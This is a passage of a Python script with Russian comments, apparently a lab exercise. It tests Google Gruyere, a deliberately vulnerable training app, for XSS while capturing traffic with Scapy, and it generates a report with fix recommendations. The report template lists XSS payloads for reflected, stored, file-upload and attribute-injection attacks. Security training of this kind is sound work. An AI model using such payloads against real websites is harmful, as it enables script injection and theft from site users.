3. РЕКОМЕНДАЦИИ ПО ИСПРАВЛЕНИЮ:
   • Всегда использовать {{variable:text}} для экранирования вывода
   • Реализовать Content Security Policy (CSP)
   • Использовать HTTPOnly флаг для cookies
   • Проверять тип загружаемых файлов
   • Использовать безопасные HTML sanitizer библиотеки

4. РЕКОМЕНДАЦИИ ПО ЗАЩИТЕ:
   • Регулярное тестирование безопасности
   • Обучение разработчиков безопасному кодированию
   • Автоматическое сканирование уязвимостей
   • Мониторинг необычной активности

{'='*100}
ИНФОРМАЦИЯ ДЛЯ ДАЛЬНЕЙШЕГО АНАЛИЗА
{'='*100}

Созданные файлы:
   • Трафик: {traffic_filename} (откройте в Wireshark)
   • Отчет: {report_filename}
   • Ответы на XSS тесты: reflected_xss_*.html, ajax_xss_*.txt

Для анализа в Wireshark:
   1. Откройте {traffic_filename}
   2. Используйте фильтр: http
   3. Ищите XSS payloads в запросах и ответах
   4. Анализируйте Content-Type заголовки

Для ручного тестирования:
   1. Reflected XSS: {GRUYERE_BASE_URL}<script>alert(1)</script>
   2. Stored XSS: создайте сниппет с <script>alert(1)</script>
   3. File Upload: загрузите HTML файл с JavaScript
   4. XSS via Color: установите цвет 'red' onload='alert(1)'

{'='*100}
КОНЕЦ ОТЧЕТА
{'='*100}
"""
    
    # Сохраняем отчет
    with open(report_filename, 'w', encoding='utf-8') as f:
        f.write(report)
    
    print(f"\n[+] Отчет сохранен в файл: {report_filename}")
    
    # Выводим краткую сводку
    print(f"\n{'='*80}")
    print("КРАТКАЯ СВОДКА")
    print(f"{'='*80}")
    print(f"Всего уязвимостей: {len(xss_tester.vulnerabilities)}")
    print(f"Захвачено пакетов: {len(traffic_analyzer.captured_packets) if traffic_analyzer else 0}")
    print(f"Обнаружено XSS в трафике: {len(traffic_analyzer.xss_traffic) if traffic_analyzer else 0}")
    print(f"Файл отчета: {report_filename}")
    print(f"Файл трафика: {traffic_filename}")
    
    return report_filename

# ============================================================================
# ГЛАВНАЯ ФУНКЦИЯ
# ============================================================================

def main():
    """Основная функция, выполняющая все этапы задания"""
    print(f"""
╔{'═'*78}╗
║{' '*78}║
║    ПОЛНОЕ XSS ТЕСТИРОВАНИЕ GOOGLE GRUYERE С АНАЛИЗОМ ТРАФИКА SCAPY   ║
║{' '*78}║
╚{'═'*78}╝
    """)
    
    print(f"[*] Конфигурация:")
    print(f"    Сервер: {GRUYERE_HOST}:{GRUYERE_PORT}")
    print(f"    Инстанс: {GRUYERE_INSTANCE}")
    print(f"    Базовый URL: {GRUYERE_BASE_URL}")
    print(f"    Интерфейс захвата: {INTERFACE}")
    print(f"    Тестовый пользователь: {TEST_USERNAME}")
    
    # Проверяем Scapy
    try:
        from scapy.all import IP, TCP
        print(f"\n[+] Scapy успешно импортирован")
    except ImportError:
        print(f"\n[-] Ошибка: Scapy не установлен!")
        print(f"[*] Установите: pip install scapy")
        return
    
    # ========================================================================
    # ЭТАП 2+3+4: Параллельный захват трафика и тестирование XSS
    # ========================================================================
    
    # Инициализируем анализатор трафика Scapy
    analyzer = ScapyTrafficAnalyzer(INTERFACE, GRUYERE_HOST, GRUYERE_PORT)
    
    # Инициализируем XSS тестер (используем http.client как в вашем скрипте)
    tester = XSSTester(GRUYERE_HOST, GRUYERE_PORT, GRUYERE_INSTANCE)
    
    # Запускаем захват трафика в отдельном потоке
    print(f"\n[*] Запускаю захват трафика Scapy в фоновом режиме...")
    
    traffic_thread = threading.Thread(target=analyzer.start_capture, args=(60,))
    traffic_thread.start()
    
    # Даем время на запуск сниффера
    time.sleep(3)
    
    # ========================================================================
    # ЭТАП 3: Тестирование XSS уязвимостей (используем http.client)
    # ========================================================================
    
    print(f"\n{'='*80}")
    print("НАЧИНАЮ ТЕСТИРОВАНИЕ XSS УЯЗВИМОСТЕЙ")
    print(f"{'='*80}")
    
    # Выполняем тесты
    tester.run_all_xss_tests()
    
    # Ждем завершения захвата трафика
    print(f"\n[*] Ожидаю завершения захвата трафика...")
    traffic_thread.join()
    
    # Получаем имя файла с трафиком
    pcap_files = [f for f in os.listdir('.') if f.startswith('gruyere_traffic_') and f.endswith('.pcap')]
    traffic_filename = pcap_files[-1] if pcap_files else "traffic_not_saved.pcap"
    
    # ========================================================================
    # ЭТАП 4: Анализ результатов в трафике
    # ========================================================================
    
    print(f"\n{'='*80}")
    print("АНАЛИЗ РЕЗУЛЬТАТОВ В СЕТЕВОМ ТРАФИКЕ")
    print(f"{'='*80}")
    
    if analyzer.captured_packets:
        print(f"[+] Проанализировано пакетов: {len(analyzer.captured_packets)}")
        print(f"[+] HTTP запросов: {len(analyzer.http_requests)}")
        print(f"[+] HTTP ответов: {len(analyzer.http_responses)}")
        
        if analyzer.xss_traffic:
            print(f"[!] Обнаружено XSS в трафике: {len(analyzer.xss_traffic)}")
            
            print(f"\n[*] Примеры обнаруженного XSS трафика:")
            for i, xss in enumerate(analyzer.xss_traffic[:3], 1):
                print(f"\n{i}. Тип: {xss['type']}")
                print(f"   Время: {xss['timestamp']}")
                if 'request' in xss:
                    print(f"   Запрос: {xss['request']['method']} {xss['request']['path'][:50]}...")
                if 'response' in xss:
                    print(f"   Ответ: {xss['response']['status_code']} {xss['response']['status_text']}")
        else:
            print(f"[-] XSS в трафике не обнаружено")
    else:
        print(f"[-] Трафик не захвачен")
    
    # ========================================================================
    # ЭТАП 5: Генерация отчета
    # ========================================================================
    
    print(f"\n{'='*80}")
    print("ГЕНЕРАЦИЯ ФИНАЛЬНОГО ОТЧЕТА")
    print(f"{'='*80}")
    
    report_file = generate_final_report(tester, analyzer, traffic_filename)
    
    # ========================================================================
    # ЗАКЛЮЧЕНИЕ
    # ========================================================================
    
    print(f"\n{'='*80}")
    print("ТЕСТИРОВАНИЕ ЗАВЕРШЕНО УСПЕШНО!")
    print(f"{'='*80}")
    
    print(f"""
СОЗДАННЫЕ ФАЙЛЫ:

1. ОТЧЕТ: {report_file}
   - Полные результаты тестирования
   - Рекомендации по исправлению
   - Анализ трафика

2. ТРАФИК: {traffic_filename}
   - Откройте в Wireshark: File → Open
   - Используйте фильтр: http
   - Ищите XSS payloads

3. ТЕСТОВЫЕ ОТВЕТЫ:
   - reflected_xss_*.html - ответы на Reflected XSS
   - ajax_xss_*.txt - ответы AJAX endpoints

РЕКОМЕНДАЦИИ:

1. Исправьте обнаруженные XSS уязвимости
2. Реализуйте Content Security Policy
3. Проводите регулярное тестирование безопасности
4. Используйте автоматические сканеры уязвимостей
    """)
    
    print(f"[*] Все созданные файлы:")
    for file in os.listdir('.'):
        if file.startswith(('gruyere_', 'reflected_', 'ajax_', 'gruyere_xss_full_report')):
            print(f"    - {file}")

if __name__ == "__main__":
    # Проверяем права администратора (для захвата трафика)
    try:
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if not is_admin:
            print("[!] ВНИМАНИЕ: Скрипт запущен без прав администратора")
            print("[!] Захват трафика может не работать корректно")
            print("[!] Запустите от имени администратора для полной функциональности")
            input("\nНажмите Enter для продолжения или Ctrl+C для выхода...")
    except:
        pass  # Не Windows система
    
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n[*] Прервано пользователем")
    except Exception as e:
        print(f"\n[-] Критическая ошибка: {e}")
        import traceback
        traceback.print_exc()
    
    input("\nНажмите Enter для выхода...")
